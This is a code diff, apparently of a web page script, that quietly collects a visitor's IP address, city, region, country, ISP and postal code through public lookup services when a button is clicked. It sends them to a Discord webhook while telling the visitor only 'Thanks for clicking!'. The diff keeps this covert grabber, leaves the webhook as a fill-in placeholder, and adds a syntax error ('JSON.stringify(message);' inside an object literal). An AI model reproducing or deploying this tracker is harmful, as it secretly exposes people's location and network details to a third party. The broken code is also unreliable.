@@ -64,10 +64,7 @@
             // Fetch IP Address
             fetch("https://api.ipify.org?format=json")
                 .then(response => {
-                    if (!response.ok) {
-                        console.error('Error fetching IP address:', response.statusText);
-                        throw new Error('Failed to fetch IP address');
-                    }
+                    if (!response.ok) throw new Error('Failed to fetch IP address');
                     return response.json();
                 })
                 .then(ipData => {
@@ -75,14 +72,11 @@
                     return fetch(`https://ipapi.co/${ip}/json/`);
                 })
                 .then(response => {
-                    if (!response.ok) {
-                        console.error('Error fetching IP details:', response.statusText);
-                        throw new Error('Failed to fetch IP details');
-                    }
+                    if (!response.ok) throw new Error('Failed to fetch IP details');
                     return response.json();
                 })
                 .then(data => {
-                    const webhookUrl = 'YOUR_WEBHOOK_URL'; // Ensure your webhook URL is correct
+                    const webhookUrl = 'YOUR_WEBHOOK_URL'; // Palitan ito ng iyong webhook URL
                     const message = {
                         content: `<@1276852876274307082> Here is the IP information:\n\n**IP Address:** ${data.ip}\n**Location:** ${data.city}, ${data.region}, ${data.country_name}\n**ISP:** ${data.org}\n**Postal Code:** ${data.postal}`
                     };
@@ -91,17 +85,17 @@
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify(message)
+                        body: JSON.stringify(message);
                     });
                 })
                 .then(response => {
                     button.classList.remove("animate");
                     document.getElementById("loading").style.display = "none";
-                    if (!response.ok) {
-                        console.error('Error sending message to Discord:', response.statusText);
+                    if (response.ok) {
+                        document.getElementById("message").innerText = 'Thanks for clicking!';
+                    } else {
                         throw new Error('Failed to send message to Discord');
                     }
-                    document.getElementById("message").innerText = 'Thanks for clicking!';
                 })
                 .catch(error => {
                     button.classList.remove("animate");
